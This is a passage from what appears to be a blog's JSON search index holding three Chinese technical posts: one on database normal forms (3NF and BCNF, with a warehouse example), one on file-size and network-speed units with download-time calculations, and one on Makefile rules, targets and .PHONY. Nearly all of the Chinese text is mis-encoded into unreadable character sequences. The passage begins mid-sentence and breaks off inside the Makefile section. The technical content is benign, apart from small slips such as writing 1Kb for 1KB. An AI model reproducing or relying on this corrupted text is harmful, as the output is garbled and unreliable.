ä¸º**ç³»å**ï¼Œä¸»å±æ€§ä¸º**ç³»å**ï¼Œéä¸»å±æ€§ä¸º**ç³»ä¸»ä»»**ï¼Œä¸å¯èƒ½å­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–ï¼ˆè‡³å°‘è¦æœ‰ä¸‰ä¸ªå±æ€§æ‰å¯èƒ½å­˜åœ¨ä¼ é€’å‡½æ•°ä¾èµ–å…³ç³»ï¼‰ï¼Œæ‰€ä»¥ç¬¦åˆ3NFçš„è¦æ±‚ã€‚ã€‚\n\n\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/7.png)\n\n\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/8.png)\n\n\n\nç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ï¼Œè¿›è¡ŒåŒæ ·çš„æ“ä½œï¼Œæ˜¯å¦è¿˜å­˜åœ¨ç€ä¹‹å‰çš„é‚£äº›é—®é¢˜ï¼Ÿ\n\n1. åˆ é™¤æŸä¸ªç³»ä¸­æ‰€æœ‰çš„å­¦ç”Ÿè®°å½•\n   è¯¥ç³»çš„ä¿¡æ¯ä¸ä¼šä¸¢å¤±ã€‚â€”â€”æœ‰æ”¹è¿›\n2. æ’å…¥ä¸€ä¸ªå°šæ— å­¦ç”Ÿçš„æ–°ç³»çš„ä¿¡æ¯ã€‚\n   å› ä¸ºç³»è¡¨ä¸å­¦ç”Ÿè¡¨ç›®å‰æ˜¯ç‹¬ç«‹çš„ä¸¤å¼ è¡¨ï¼Œæ‰€ä»¥ä¸å½±å“ã€‚â€”â€”æœ‰æ”¹è¿›\n3. æ•°æ®å†—ä½™æ›´åŠ å°‘äº†ã€‚â€”â€”æœ‰æ”¹è¿›\n\n\n\nç”±æ­¤å¯è§ï¼Œç¬¦åˆ3NFè¦æ±‚çš„æ•°æ®åº“è®¾è®¡ï¼Œ**åŸºæœ¬**ä¸Šè§£å†³äº†æ•°æ®å†—ä½™è¿‡å¤§ï¼Œæ’å…¥å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸ï¼Œåˆ é™¤å¼‚å¸¸çš„é—®é¢˜ã€‚å½“ç„¶ï¼Œåœ¨å®é™…ä¸­ï¼Œå¾€å¾€ä¸ºäº†æ€§èƒ½ä¸Šæˆ–è€…åº”å¯¹æ‰©å±•çš„éœ€è¦ï¼Œç»å¸¸ åšåˆ°2NFæˆ–è€…1NFï¼Œä½†æ˜¯ä½œä¸ºæ•°æ®åº“è®¾è®¡äººå‘˜ï¼Œè‡³å°‘åº”è¯¥çŸ¥é“ï¼Œ3NFçš„è¦æ±‚æ˜¯æ€æ ·çš„ã€‚\n\n\n\n#### 3.3.3 å®šä¹‰\n\nå¦‚æœå…³ç³»æ¨¡å¼Ræ˜¯2NFï¼Œä¸”å…³ç³»æ¨¡å¼Rï¼ˆU,Fï¼‰ä¸­çš„æ‰€æœ‰éä¸»å±æ€§å¯¹ä»»ä½•å€™é€‰å…³é”®å­—éƒ½ä¸å­˜åœ¨ä¼ é€’ä¾èµ–ï¼Œåˆ™ç§°å…³ç³»Ræ˜¯å±äºç¬¬ä¸‰èŒƒå¼ã€‚\n\nç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰ï¼›ç¬¦åˆ2NFï¼Œå¹¶ä¸”ï¼Œæ¶ˆé™¤ä¼ é€’ä¾èµ–ã€‚\n\n\n\n## 3.4 BCNF\n#### 3.4.1 3NF ä¹Ÿä¼šæœ‰ä¸€äº›é—®é¢˜\n\n1. æŸå…¬å¸æœ‰è‹¥å¹²ä¸ªä»“åº“ï¼›\n2. æ¯ä¸ªä»“åº“åªèƒ½æœ‰ä¸€åç®¡ç†å‘˜ï¼Œä¸€åç®¡ç†å‘˜åªèƒ½åœ¨ä¸€ä¸ªä»“åº“ä¸­å·¥ä½œï¼›\n3. ä¸€ä¸ªä»“åº“ä¸­å¯ä»¥å­˜æ”¾å¤šç§ç‰©å“ï¼Œä¸€ç§ç‰©å“ä¹Ÿå¯ä»¥å­˜æ”¾åœ¨ä¸åŒçš„ä»“åº“ä¸­ã€‚æ¯ç§ç‰©å“åœ¨æ¯ä¸ªä»“åº“ä¸­éƒ½æœ‰å¯¹åº”çš„æ•°é‡ã€‚\n\né‚£ä¹ˆå…³ç³»æ¨¡å¼ ä»“åº“ï¼ˆä»“åº“åï¼Œç®¡ç†å‘˜ï¼Œç‰©å“åï¼Œæ•°é‡ï¼‰ å±äºå“ªä¸€çº§èŒƒå¼ï¼Ÿ\n\nå·²çŸ¥å‡½æ•°ä¾èµ–é›†ï¼šä»“åº“å â†’ ç®¡ç†å‘˜ï¼Œç®¡ç†å‘˜ â†’ ä»“åº“åï¼Œï¼ˆä»“åº“åï¼Œç‰©å“åï¼‰â†’ æ•°é‡\nç ï¼šï¼ˆç®¡ç†å‘˜ï¼Œç‰©å“åï¼‰ï¼Œï¼ˆä»“åº“åï¼Œç‰©å“åï¼‰\nä¸»å±æ€§ï¼šä»“åº“åã€ç®¡ç†å‘˜ã€ç‰©å“å\néä¸»å±æ€§ï¼šæ•°é‡\n\nâˆµ ä¸å­˜åœ¨éä¸»å±æ€§å¯¹ç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–å’Œä¼ é€’å‡½æ•°ä¾èµ–ã€‚âˆ´ æ­¤å…³ç³»æ¨¡å¼å±äº3NFã€‚\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/9.png)\n\nå¥½ï¼Œæ—¢ç„¶æ­¤å…³ç³»æ¨¡å¼å·²ç»å±äºäº† 3NFï¼Œé‚£ä¹ˆè¿™ä¸ªå…³ç³»æ¨¡å¼æ˜¯å¦å­˜åœ¨é—®é¢˜å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä»¥ä¸‹å‡ ç§æ“ä½œï¼š\n\n1. å…ˆæ–°å¢åŠ ä¸€ä¸ªä»“åº“ï¼Œä½†å°šæœªå­˜æ”¾ä»»ä½•ç‰©å“ï¼Œæ˜¯å¦å¯ä»¥ä¸ºè¯¥ä»“åº“æŒ‡æ´¾ç®¡ç†å‘˜ï¼Ÿâ€”â€”ä¸å¯ä»¥ï¼Œå› ä¸ºç‰©å“åä¹Ÿæ˜¯ä¸»å±æ€§ï¼Œæ ¹æ®å®ä½“å®Œæ•´æ€§çš„è¦æ±‚ï¼Œä¸»å±æ€§ä¸èƒ½ä¸ºç©ºã€‚\n2. æŸä»“åº“è¢«æ¸…ç©ºåï¼Œéœ€è¦åˆ é™¤æ‰€æœ‰ä¸è¿™ä¸ªä»“åº“ç›¸å…³çš„ç‰©å“å­˜æ”¾è®°å½•ï¼Œä¼šå¸¦æ¥ä»€ä¹ˆé—®é¢˜ï¼Ÿâ€”â€”ä»“åº“æœ¬èº«ä¸ç®¡ç†å‘˜çš„ä¿¡æ¯ä¹Ÿè¢«éšä¹‹åˆ é™¤äº†ã€‚\n3. å¦‚æœæŸä»“åº“æ›´æ¢äº†ç®¡ç†å‘˜ï¼Œä¼šå¸¦æ¥ä»€ä¹ˆé—®é¢˜ï¼Ÿâ€”â€”è¿™ä¸ªä»“åº“æœ‰å‡ æ¡ç‰©å“å­˜æ”¾è®°å½•ï¼Œå°±è¦ä¿®æ”¹å¤šå°‘æ¬¡ç®¡ç†å‘˜ä¿¡æ¯ã€‚\n\nä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼Œåœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå³ä½¿å…³ç³»æ¨¡å¼ç¬¦åˆ 3NF çš„è¦æ±‚ï¼Œä»ç„¶å­˜åœ¨ç€æ’å…¥å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸ä¸åˆ é™¤å¼‚å¸¸çš„é—®é¢˜ï¼Œä»ç„¶ä¸æ˜¯ â€å¥½â€œ çš„è®¾è®¡ã€‚\n\n\n\n#### 3.3.2  æ‹†è¡¨ç¬¦åˆBCNF\n\né€ æˆæ­¤é—®é¢˜çš„åŸå› ï¼šå­˜åœ¨ç€**ä¸»å±æ€§**å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ä¸ä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n\nï¼ˆåœ¨æ­¤ä¾‹ä¸­å°±æ˜¯å­˜åœ¨ä¸»å±æ€§ã€ä»“åº“åã€‘å¯¹äºç ã€ï¼ˆç®¡ç†å‘˜ï¼Œç‰©å“åï¼‰ã€‘çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n\nè§£å†³åŠæ³•å°±æ˜¯è¦åœ¨ 3NF çš„åŸºç¡€ä¸Šæ¶ˆé™¤**ä¸»å±æ€§**å¯¹äºç çš„éƒ¨åˆ†ä¸ä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n\n\n\nä»“åº“ï¼ˆä»“åº“åï¼Œç®¡ç†å‘˜ï¼‰\nåº“å­˜ï¼ˆä»“åº“åï¼Œç‰©å“åï¼Œæ•°é‡ï¼‰\n\nè¿™æ ·ï¼Œä¹‹å‰çš„æ’å…¥å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸ä¸åˆ é™¤å¼‚å¸¸çš„é—®é¢˜å°±è¢«è§£å†³äº†ã€‚\n\n\n\n#### 3.4.3 å®šä¹‰\n\nç¬¦åˆ3NFï¼Œå¹¶ä¸”ï¼Œä¸»å±æ€§ä¸ä¾èµ–äºä¸»å±æ€§ã€‚è‹¥å…³ç³»æ¨¡å¼Rå±äºç¬¬ä¸€èŒƒå¼ï¼Œä¸”æ¯ä¸ªå±æ€§éƒ½ä¸ä¼ é€’ä¾èµ–äºé”®ç ï¼Œåˆ™Rå±äºBCèŒƒå¼ã€‚\n\n\n\n## 3.5 æ€»ç»“\n\nåº”ç”¨çš„èŒƒå¼è¶Šé«˜ï¼Œåˆ™è¡¨è¶Šå¤šã€‚è¡¨å¤šä¼šå¸¦æ¥å¾ˆå¤šé—®é¢˜ï¼š1 æŸ¥è¯¢æ—¶è¦è¿æ¥å¤šä¸ªè¡¨ï¼Œå¢åŠ äº†æŸ¥è¯¢çš„å¤æ‚åº¦. 2 æŸ¥è¯¢æ—¶éœ€è¦è¿æ¥å¤šä¸ªè¡¨ï¼Œé™ä½äº†æ•°æ®åº“æŸ¥è¯¢æ€§èƒ½\n\næ‰€ä»¥æœ‰çš„æ—¶å€™éœ€è¦åº”ç”¨åèŒƒå¼åŒ–\n\n+ 2NFåœ¨1NFçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ¶ˆé™¤äº†**éä¸»å±æ€§**å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n+ 3NFåœ¨2NFçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ¶ˆé™¤äº†**éä¸»å±æ€§**å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n+ BCNF åœ¨3NFçš„åŸºç¡€ä¸Šï¼Œæ¶ˆé™¤**ä¸»å±æ€§**å¯¹äºç çš„éƒ¨åˆ†ä¸ä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n\n\n\n# 4. å¤´è„‘é£æš´\n\n+ 1NF, æ•°æ®åº“é»˜è®¤å°±æ˜¯, ä¸ç”¨è€ƒè™‘\n+ 2NF  ç å¯ä»¥å†³å®šä¸€åˆ‡, ä½†æ˜¯ä¸èƒ½ä¸€éƒ¨åˆ†å°±å†³å®š.  (AB->CD) ä½†æ˜¯ (A->C)    ä¸èƒ½è¿™æ ·, è¦æ”¹\n+ 3NF  ç å¯ä»¥å†³å®šä¸€åˆ‡, ä½†æ˜¯ä¸èƒ½é—´æ¥å†³å®š.          (A->B->C)  ä¸èƒ½è¿™æ ·, è¦æ”¹\n+ BCNF ç è‡ªå·±çš„ä¸»å±æ€§ç›¸äº’ä¾èµ–,å…ˆè§£å†³è‡ªå·±çš„ä¾èµ–æˆä¸º BCNF       (AB->CD)   ä½†æ˜¯ (A->B) , è¦æ”¹\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/24696366/answer/29189700\n+ https://www.cnblogs.com/rosesmall/p/9585655.html","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"æ–‡ä»¶å¤§å°å’Œç½‘é€Ÿçš„å•ä½","url":"%2Fp%2F3160c079.html","content":"\n\n\n# 1. å­˜å‚¨å•ä½\n\nè®¡ç®—æœºå‘å‡ºçš„ä¿¡å·éƒ½æ˜¯æ•°å­—å½¢å¼çš„ï¼Œæ¯”ç‰¹(bit)æ¥æºäº `binary digit`, æ„æ€æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ•°å­—ã€‚ä¸€ä¸ªæ¯”ç‰¹å°±æ˜¯äºŒè¿›åˆ¶æ•°å­—ä¸­çš„ä¸€ä¸ª1 æˆ– 0ã€‚æˆ‘ä»¬ç§°ä¸ºå°bã€‚\n\nè®¡ç®—æœºçš„æ•°æ®é‡å¸¸å¸¸ç”¨å­—èŠ‚ B ä½œä¸ºåº¦é‡çš„**å•ä½(Bä»£è¡¨byte)**ï¼Œé€šå¸¸ä¸€ä¸ªå­—èŠ‚ Byte ä»£è¡¨8ä¸ªæ¯”ç‰¹ã€‚æˆ‘ä»¬ç§°ä¸ºå¤§Bã€‚\n\n> æ‰€ä»¥ 1 ä¸ªå¤§B ç­‰äº 8 ä¸ª å°bã€‚\n\n<!-- more -->\n\n### 1.1 æ–‡ä»¶å­˜å‚¨å•ä½\n\n+ K = 2çš„10æ¬¡æ–¹Byte        **1K = 1024Byte = 1024*8 bit** \n+ M = 2çš„20æ¬¡æ–¹Byte\n+ G = 2çš„30æ¬¡æ–¹Byte\n+ T = 2çš„40æ¬¡æ–¹Byte\n+ .......(1024å•ä½)\n\n\n\n### 1.2 è®¡ç®—æœºæœ¯è¯­\n\n1ä¸ªå­—èŠ‚ï¼ˆ8ä¸ªbitï¼‰å¯ä»¥å­˜-128-127ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ª8ä½ä¸€å…±èƒ½è¡¨ç¤º2çš„8æ¬¡æ–¹ï¼Œæœ€å¤§èƒ½è¡¨ç¤º255ã€‚\n\nint32å 4ä¸ªå­—èŠ‚(32ä¸ªbit)ï¼Œ-2147483648 to 2147483647 ï¼Œä¸€å…±èƒ½è¡¨ç¤º2çš„32æ¬¡æ–¹ã€‚\n\nint64å 8ä¸ªå­—èŠ‚(64ä¸ªbit) : -9223372036854775808 to 9223372036854775807 ï¼Œ ä¸€å…±èƒ½è¡¨ç¤º2çš„64æ¬¡æ–¹ã€‚\n\n\n\n### 1.3 1Kb æœ‰å¤šå¤§\n\næˆ‘ä»¬åˆå¸¸è¯´ä¸€ä¸ªæ–‡ä»¶å¤šå°‘å¤šå°‘kï¼Œå…¶ä¸­ 1K = 1024Byte = 1024*8 bitã€‚1Kå­—èŠ‚è¡¨ç¤ºçš„äºŒè¿›åˆ¶ä½æ•°ä¸º8192ä½ï¼Œä¸€å…±èƒ½è¡¨ç¤º2çš„8192æ¬¡æ–¹ã€‚\n\n\n\nASCIIç ï¼šä¸€ä¸ªè‹±æ–‡å­—æ¯ï¼ˆä¸åˆ†å¤§å°å†™ï¼‰å ä¸€ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œä¸€ä¸ªä¸­æ–‡æ±‰å­—å ä¸¤ä¸ªå­—èŠ‚çš„ç©ºé—´ã€‚\n\næ‰€ä»¥1Kbä¸€èˆ¬èƒ½å­˜å‚¨1024ä¸ªå­—æ¯ï¼Œæˆ– 512 ä¸ªæ±‰å­—ã€‚\n\n\n\n# 2. ç½‘ç»œé€Ÿç‡å•ä½\n\né€Ÿç‡æ˜¯è®¡ç®—æœºç½‘ç»œä¸­æœ€é‡è¦çš„ä¸€ä¸ªæ€§èƒ½æŒ‡æ ‡,  é€Ÿç‡çš„å•ä½æ˜¯ `bit/s` | `b/s` |` bps`  (æ¯”ç‰¹æ¯ç§’)ï¼Œä¸‰ä¸ªå•ä½ä¸€ä¸ªæ„æ€ï¼Œå¸¸è§çš„æ˜¯ bpsã€‚\n\n+ k = 10çš„3æ¬¡æ–¹  (kbps)        \n\n+ M = 10çš„6æ¬¡æ–¹ (Mbps)\n+ G = 10çš„9æ¬¡æ–¹\n+ T = 10çš„12æ¬¡æ–¹\n+ .......(1000å•ä½)\n\n\n\n### 2.1 å­˜å‚¨å’Œé€Ÿç‡çš„è®¡ç®—\n\n15Gçš„æ•°æ®å—ä»¥ 5G çš„é€Ÿç‡ä¼ é€ï¼Œéœ€è¦å¤šå°‘æ—¶é—´?    éƒ½æ¢ç®—æˆbï¼ˆåŒå•ä½ï¼‰ï¼Œå†è¿›è¡Œè®¡ç®—ã€‚\n\nè§£ï¼š  15 * 2^30 * 8 æ¯”ç‰¹çš„æ•°æ®å—  ä»¥ 5 * 10^9  bps çš„é€Ÿç‡ä¼ é€ï¼Œä¸¤ä¸ªç›¸é™¤å°±æ˜¯æ—¶é—´ã€‚\n\n = 128849018880/5000000000 = 25.76980378ç§’\n\n\n\n### 2.2 å®¶åº­100Mbpså®½å¸¦\n\næˆ‘ä»¬å®¶åº­å¸¸è¯´çš„å‡ Må¸¦å®½ï¼ˆ100å…†å®½å¸¦ï¼Œ100Mbpsï¼‰æ˜¯ä»¥æ¯”ç‰¹ä¸ºå•ä½çš„ï¼Œè€Œæˆ‘ä»¬å¸¸çœ‹åˆ°çš„ä¸‹è½½é€Ÿåº¦æ˜¾ç¤ºçš„å‡ KBæ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½ã€‚\n\n\n\n##### 2.2.1 ç†è®ºä¸‹è½½é€Ÿåº¦\n\n100Ã—10^6ï¼100000000ä½ã€‚å› ä¸º8ä¸ªä½ç­‰äº1ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¿™ä¸ªé€Ÿåº¦æ¯ç§’å¯ä¸‹è½½100000000ä½Ã·8=12500000å­—èŠ‚ã€‚\n\n12500000å­—èŠ‚/1024/1024 â‰ˆ 11.92Mã€‚\n\næœ‰çš„è®¡ç®—æ–¹å¼æ˜¯ç›´æ¥é™¤ä»¥8ï¼Œæ˜¯12.5Mã€‚\n\n\n\n##### 2.2.2 100å…†ä¸‹è½½ç”µå½±\n\nä»¥ä¸€ä¸ª10 Gç”µå½±ä¸ºä¾‹ï¼Œä¸‹è½½ä¸‹æ¥éœ€è¦å¤šä¹…ï¼Ÿ\n\næ–‡ä»¶æ¢ç®—æˆMï¼Œ 10*1024 = 10240M\n\nä¸‹è½½æ¢ä¹˜æˆMï¼Œ 100/8 =  12.5M\n\néœ€è¦å¤šå°‘æ—¶é—´ï¼š10240/12.5 = 819.2ç§’ = 13.65åˆ†é’Ÿ\n\n\n\n# 3. æ€»ç»“\n\n+ åœ¨è®¡ç®—æœºé¢†åŸŸä¸­, æ‰€æœ‰çš„å•ä½éƒ½ä½¿ç”¨å¤§å†™å­—æ¯(K, M, G....)\n\n+ åœ¨é€šä¿¡é¢†åŸŸä¸­, åªæœ‰1000ä½¿ç”¨ k, å…¶ä½™çš„éƒ½ç”¨å¤§å†™(M, G....)\n\n+ æœ‰çš„ä¸ä¸¥æ ¼åŒºåˆ†, å¤§å†™çš„ K å³å¯ä»¥è¡¨ç¤º1000, ä¹Ÿå¯ä»¥è¡¨ç¤º1024\n\n\n\n# 4. å‚è€ƒèµ„æ–™ \n\n+ è®¡ç®—æœºç½‘ç»œç¬¬7ç‰ˆ(è°¢å¸Œä»)","tags":["å•ä½"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"makefileçš„ç¼–å†™è§„åˆ™","url":"%2Fp%2F4cf47ff4.html","content":"\n\n\n### 1. Makefile ä»‹ç»\n\nMakefileæ–‡ä»¶ç”±ä¸€ç³»åˆ—è§„åˆ™ï¼ˆrulesï¼‰æ„æˆã€‚æ¯æ¡è§„åˆ™çš„å½¢å¼å¦‚ä¸‹ã€‚\n\n```bash\n<target> : <prerequisites> \n[tab]  <commands>\n```\n\nä¸Šé¢ç¬¬ä¸€è¡Œå†’å·å‰é¢çš„éƒ¨åˆ†ï¼Œå«åš\"ç›®æ ‡\"ï¼ˆtargetï¼‰ï¼Œå†’å·åé¢çš„éƒ¨åˆ†å«åš\"å‰ç½®æ¡ä»¶\"ï¼ˆprerequisitesï¼‰ï¼›ç¬¬äºŒè¡Œå¿…é¡»ç”±ä¸€ä¸ªtabé”®èµ·é¦–ï¼Œåé¢è·Ÿç€\"å‘½ä»¤\"ï¼ˆcommandsï¼‰ã€‚\n\n\"ç›®æ ‡\"æ˜¯å¿…éœ€çš„ï¼Œä¸å¯çœç•¥ï¼›\"å‰ç½®æ¡ä»¶\"å’Œ\"å‘½ä»¤\"éƒ½æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯ä¸¤è€…ä¹‹ä¸­å¿…é¡»è‡³å°‘å­˜åœ¨ä¸€ä¸ªã€‚\n\næ¯æ¡è§„åˆ™å°±æ˜ç¡®ä¸¤ä»¶äº‹ï¼šæ„å»ºç›®æ ‡çš„å‰ç½®æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Œä»¥åŠå¦‚ä½•æ„å»ºã€‚\n\n<!-- more -->\n\n##### 1.1 ç›®æ ‡ï¼ˆtargetï¼‰\n\nä¸€ä¸ªç›®æ ‡ï¼ˆtargetï¼‰å°±æ„æˆä¸€æ¡è§„åˆ™ã€‚ç›®æ ‡é€šå¸¸æ˜¯æ–‡ä»¶åï¼ŒæŒ‡æ˜Makeå‘½ä»¤æ‰€è¦æ„å»ºçš„å¯¹è±¡ï¼Œç›®æ ‡å¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªæ–‡ä»¶åï¼Œä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚\n\né™¤äº†æ–‡ä»¶åï¼Œç›®æ ‡è¿˜å¯ä»¥æ˜¯æŸä¸ªæ“ä½œçš„åå­—ï¼Œè¿™ç§°ä¸º\"ä¼ªç›®æ ‡\"ï¼ˆphony targetï¼‰ã€‚\n\n```makefile\nclean:\n      rm *.o\n```\n\nä¸Šé¢ä»£ç çš„ç›®æ ‡æ˜¯cleanï¼Œå®ƒä¸æ˜¯æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªæ“ä½œçš„åå­—ï¼Œå±äº\"ä¼ªç›®æ ‡ \"ï¼Œä½œç”¨æ˜¯åˆ é™¤å¯¹è±¡æ–‡ä»¶ã€‚\n\n```bash\n$ make  clean\n```\n\nä½†æ˜¯ï¼Œå¦‚æœå½“å‰ç›®å½•ä¸­ï¼Œæ­£å¥½æœ‰ä¸€ä¸ªæ–‡ä»¶å«åšcleanï¼Œé‚£ä¹ˆè¿™ä¸ªå‘½ä»¤ä¸ä¼šæ‰§è¡Œã€‚å› ä¸ºMakeå‘ç°cleanæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå°±è®¤ä¸ºæ²¡æœ‰å¿…è¦é‡æ–°æ„å»ºäº†ï¼Œå°±ä¸ä¼šæ‰§è¡ŒæŒ‡å®šçš„rmå‘½ä»¤ã€‚\n\n\n\nä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œå¯ä»¥æ˜ç¡®å£°æ˜cleanæ˜¯\"ä¼ªç›®æ ‡\"ï¼Œå†™æ³•å¦‚ä¸‹ã€‚\n\n```makefile\n.PHONY: clean\nclean:\n        rm *.o temp\n```\n\n\n\nå£°æ˜cleanæ˜¯\"ä¼ªç›®æ ‡\"ä¹‹åï¼Œmakeå°±ä¸ä¼šå»æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå«åšcleançš„æ–‡ä»¶ï¼Œè€Œæ˜¯æ¯æ¬¡è¿è¡Œéƒ½æ‰§è¡Œå¯¹åº”çš„å‘½ä»¤ã€‚\n\n\n\nå¦‚æœMakeå‘½ä»¤è¿è¡Œæ—¶æ²¡æœ‰æŒ‡å®šç›®æ ‡ï¼Œé»˜è®¤ä¼šæ‰§è¡ŒMakefileæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªç›®æ ‡ã€‚\n\n```bash\nmake\n```\n\n\n\n##### 1.2 å‰ç½®æ¡ä»¶ï¼ˆprerequisitesï¼‰\n\nå‰ç½®æ¡ä»¶é€šå¸¸æ˜¯ä¸€ç»„æ–‡ä»¶åï¼Œä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚å®ƒæŒ‡å®šäº†\"ç›®æ ‡\"æ˜¯å¦é‡æ–°æ„å»ºçš„åˆ¤æ–­æ ‡å‡†ï¼šåªè¦æœ‰ä¸€ä¸ªå‰ç½®æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæˆ–è€…æœ‰è¿‡æ›´æ–°ï¼ˆå‰ç½®æ–‡ä»¶çš„last-modificationæ—¶é—´æˆ³æ¯”ç›®æ ‡çš„æ—¶é—´æˆ³æ–°ï¼‰ï¼Œ\"ç›®æ ‡\"å°±éœ€è¦é‡æ–°æ„å»ºã€‚\n\n```makefile\nresult.txt: source.txt\n    cp source.txt result.txt\n```\n\nä¸Šé¢ä»£ç ä¸­ï¼Œæ„å»º result.txt çš„å‰ç½®æ¡ä»¶æ˜¯ source.txt ã€‚å¦‚æœå½“å‰ç›®å½•ä¸­ï¼Œsource.txt å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆ`make result.txt`å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œå¦åˆ™å¿…é¡»å†å†™ä¸€æ¡è§„åˆ™ï¼Œæ¥ç”Ÿæˆ source.txt ã€‚\n\n```makefile\nsource.txt:\n    echo \"this is the source\" > source.txt\n```\n\n\n\nä¸Šé¢ä»£ç ä¸­ï¼Œsource.txtåé¢æ²¡æœ‰å‰ç½®æ¡ä»¶ï¼Œå°±æ„å‘³ç€å®ƒè·Ÿå…¶ä»–æ–‡ä»¶éƒ½æ— å…³ï¼Œåªè¦è¿™ä¸ªæ–‡ä»¶è¿˜ä¸å­˜åœ¨ï¼Œæ¯æ¬¡è°ƒç”¨`make source.txt`ï¼Œå®ƒéƒ½ä¼šç”Ÿæˆã€‚\n\n```bash\n$ make result.txt\n$ make result.txt\n```\n\nä¸Šé¢å‘½ä»¤è¿ç»­æ‰§è¡Œä¸¤æ¬¡`make result.txt`ã€‚ç¬¬ä¸€æ¬¡æ‰§è¡Œä¼šå…ˆæ–°å»º source.txtï¼Œç„¶åå†æ–°å»º result.txtã€‚ç¬¬äºŒæ¬¡æ‰§è¡Œï¼ŒMakeå‘ç° source.txt æ²¡æœ‰å˜åŠ¨ï¼ˆæ—¶é—´æˆ³æ™šäº result.txtï¼‰ï¼Œå°±ä¸ä¼šæ‰§è¡Œä»»ä½•æ“ä½œï¼Œresult.txt ä¹Ÿä¸ä¼šé‡æ–°ç”Ÿæˆã€‚\n\n##### 1.3 å‘½ä»¤ï¼ˆcommandsï¼‰\n\nå‘½ä»¤ï¼ˆcommandsï¼‰è¡¨ç¤ºå¦‚ä½•æ›´æ–°ç›®æ ‡æ–‡ä»¶ï¼Œç”±ä¸€è¡Œæˆ–å¤šè¡Œçš„Shellå‘½ä»¤ç»„æˆã€‚å®ƒæ˜¯æ„å»º\"ç›®æ ‡\"çš„å…·ä½“æŒ‡ä»¤ï¼Œå®ƒçš„è¿è¡Œç»“æœé€šå¸¸å°±æ˜¯ç”Ÿæˆç›®æ ‡æ–‡ä»¶ã€‚\n\næ¯è¡Œå‘½ä»¤ä¹‹å‰å¿…é¡»æœ‰ä¸€ä¸ªtabé”®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¯è¡Œå‘½ä»¤åœ¨ä¸€ä¸ªå•ç‹¬çš„shellä¸­æ‰§è¡Œã€‚è¿™äº›Shellä¹‹é—´æ²¡æœ‰ç»§æ‰¿å…³ç³»ã€‚\n\n```makefile\nvar-lost:\n    export foo=bar\n    echo \"foo=[$$foo]\"\n```\n\nä¸Šé¢ä»£ç æ‰§è¡Œåï¼ˆ`make var-lost`ï¼‰ï¼Œå–ä¸åˆ°fooçš„å€¼ã€‚å› ä¸ºä¸¤è¡Œå‘½ä»¤åœ¨ä¸¤ä¸ªä¸åŒçš„è¿›ç¨‹æ‰§è¡Œã€‚ä¸€ä¸ªè§£å†³åŠæ³•æ˜¯å°†ä¸¤è¡Œå‘½ä»¤å†™åœ¨ä¸€è¡Œï¼Œä¸­é—´ç”¨åˆ†å·åˆ†éš”ã€‚\n\n```makefile\nvar-kept:\n    export foo=bar; echo \"foo=[$$foo]\"\n```\n\nå¦ä¸€ä¸ªè§£å†³åŠæ³•æ˜¯åœ¨æ¢è¡Œç¬¦å‰åŠ åæ–œæ è½¬ä¹‰ã€‚\n\n```makefile\nvar-kept:\n    export foo=bar; \\\n    echo \"foo=[$$foo]\"\n```\n\n\n\n\n\n### 2. Makefileæ–‡ä»¶çš„è¯­æ³•\n\n\n\n##### 2.1 äº•å·ï¼ˆ#ï¼‰\n\nåœ¨Makefileä¸­è¡¨ç¤ºæ³¨é‡Šã€‚\n\n\n\n##### 2.2 å›å£°ï¼ˆechoingï¼‰\n\næ­£å¸¸æƒ…å†µä¸‹ï¼Œmakeä¼šæ‰“å°æ¯æ¡å‘½ä»¤ï¼Œç„¶åå†æ‰§è¡Œï¼Œè¿™å°±å«åšå›å£°ï¼ˆechoingï¼‰ã€‚\n\nåœ¨å‘½ä»¤çš„å‰é¢åŠ 